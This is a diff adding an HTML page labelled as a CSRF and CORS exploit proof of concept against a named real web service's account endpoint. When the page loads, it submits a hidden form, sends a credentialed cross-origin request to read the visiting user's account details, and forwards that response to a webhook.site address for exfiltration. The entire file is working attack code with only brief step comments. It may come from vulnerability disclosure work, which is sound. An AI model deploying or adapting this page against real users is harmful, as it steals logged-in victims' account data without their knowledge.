@@ -1,0 +1,33 @@
+<html>
+  <!-- CSRF + CORS Exploit PoC -->
+  <body>
+    <form id="csrfForm"
+          action="https://www.idrive.com/idrive/home/c2c/seat/details"
+          method="POST">
+      <input type="hidden" name="subuser" value="yes" />
+    </form>
+
+    <script>
+      // Step 1: Trigger CSRF request
+      document.getElementById("csrfForm").submit();
+
+      // Step 2: Send same request via fetch to read response (CORS abuse)
+      fetch("https://www.idrive.com/idrive/home/c2c/seat/details", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "subuser=yes"
+      })
+      .then(res => res.text())
+      .then(data => {
+        // Step 3: Exfiltrate response to your server
+        fetch("https://webhook.site/YOUR-UNIQUE-ID", {
+          method: "POST",
+          body: data
+        });
+      });
+    </script>
+  </body>
+</html>
